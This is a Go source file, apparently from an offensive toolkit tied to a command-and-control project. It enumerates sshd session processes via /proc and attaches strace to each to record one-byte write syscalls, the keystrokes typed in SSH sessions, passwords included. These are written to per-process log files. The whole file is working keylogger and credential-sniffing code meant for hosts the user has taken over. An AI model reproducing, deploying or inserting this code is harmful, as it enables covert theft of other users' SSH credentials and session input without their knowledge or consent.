package pry

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/PatronC2/sshpry-go/strace"
)

var activeProcesses = make(map[int]bool)
var mu sync.Mutex

func GetSSHProcesses() ([]int, error) {
	var sshPids []int
	var listenerPID int

	entries, err := os.ReadDir("/proc")
	if err != nil {
		return nil, err
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}

		pid, err := strconv.Atoi(entry.Name())
		if err != nil {
			continue
		}

		cmdlineBytes, err := os.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
		if err != nil {
			continue
		}
		cmdline := string(cmdlineBytes)

		if !strings.Contains(cmdline, "sshd") {
			continue
		}

		// Find the SSH listener (likely parent is PID 1)
		statBytes, err := os.ReadFile(fmt.Sprintf("/proc/%d/stat", pid))
		if err != nil {
			continue
		}

		fields := strings.Fields(string(statBytes))
		if len(fields) >= 4 {
			ppid, err := strconv.Atoi(fields[3])
			if err == nil && ppid == 1 && listenerPID == 0 {
				listenerPID = pid
				continue // skip the main listener
			}
		}

		// Skip if this is the same as the listener
		if pid == listenerPID {
			continue
		}

		sshPids = append(sshPids, pid)
	}

	return sshPids, nil
}

func StartTracing(pid int) {
	mu.Lock()
	if activeProcesses[pid] {
		mu.Unlock()
		return
	}
	activeProcesses[pid] = true
	mu.Unlock()

	fmt.Printf("Starting trace on SSH process: %d\n", pid)

	s := strace.STrace{
		Flags: map[string]string{
			"-s": "16384",
			"-p": strconv.Itoa(pid),
			"-e": "write",
		},
	}

	err := s.Trace()
	if err != nil {
		log.Printf("Failed to start trace on PID %d: %v", pid, err)
		return
	}
	stderrFile, err := os.Create(fmt.Sprintf("trace_err_%d.log", pid))
	if err != nil {
		log.Printf("Failed to create stderr log file for PID %d: %v", pid, err)
		return
	}

	go func() {
		defer stderrFile.Close()

		for {
			stderrStr := s.Stderr.String()
			if stderrStr != "" {
				lines := strings.Split(stderrStr, "\n")
				for _, line := range lines {
					line = strings.TrimSpace(line)
					if strings.HasSuffix(line, "= 1") {
						stderrFile.WriteString(line + "\n")
					}
				}
			}

			s.Stderr.Reset()
			time.Sleep(1 * time.Second)
		}
	}()
}
